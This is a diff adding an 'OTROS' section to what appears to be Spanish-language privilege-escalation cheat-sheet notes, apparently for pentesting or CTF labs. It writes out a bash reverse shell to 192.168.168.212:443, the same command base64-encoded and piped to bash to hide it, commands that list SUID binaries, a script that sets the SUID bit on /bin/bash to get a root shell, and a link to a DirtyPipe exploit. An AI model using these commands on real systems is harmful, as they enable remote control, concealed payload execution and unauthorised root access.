@@ -124,3 +124,36 @@ os.system("chmod u+s /bin/bash")
 </pre>
 
 Y luego **bash -p**
+
+
+## OTROS
+
+Nos mandamos consola:
+
+<pre>
+echo 'bash -i >& /dev/tcp/192.168.168.212/443 0>&1' | base64 
+
+echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE2OC4yMTIvNDQzIDA+JjEK' | base64 -d | bash
+
+</pre>
+
+Para buscar ficheros con permisos suid
+
+<pre>
+
+find / -perm -u=s -type f 2>/dev/null
+find \-perm -4000 2>/dev/null
+
+
+</pre>
+
+Permisos de superusuario a la consola:
+
+<pre>
+#!/bin/bash
+
+chmod u+s /bin/bash
+</pre>
+Al tener pkexec utilizamos:
+
+https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
